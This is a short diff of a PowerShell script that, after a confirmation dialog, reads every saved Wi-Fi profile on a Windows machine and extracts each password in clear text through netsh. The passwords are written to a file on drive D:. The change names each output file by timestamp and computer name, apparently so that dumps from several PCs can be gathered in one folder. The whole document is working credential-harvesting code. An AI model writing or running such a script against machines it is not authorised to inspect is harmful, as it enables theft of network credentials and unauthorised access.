@@ -7,6 +7,9 @@ $result = [System.Windows.Forms.MessageBox]::Show(
 )
 
 if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
+    $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+    $pcname = $env:COMPUTERNAME
+    $outputPath = "D:\dumpfi\$timestamp-$pcname.dfi22"
     $profiles = netsh wlan show profiles
     foreach ($line in $profiles) {
         if ($line -match "All User Profile\s*:\s*(.+)") {
@@ -14,7 +17,7 @@ if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
             $details = netsh wlan show profile name="$name" key=clear
             $pw = ($details | Select-String "Key Content").ToString().Split(":")[1].Trim()
             if ($pw) {
-                Add-Content -Path "D:\wifi_passwords.txt" -Value "$name : $pw"
+                Add-Content -Path $outputPath -Value "$name : $pw"
             }
         }
     }
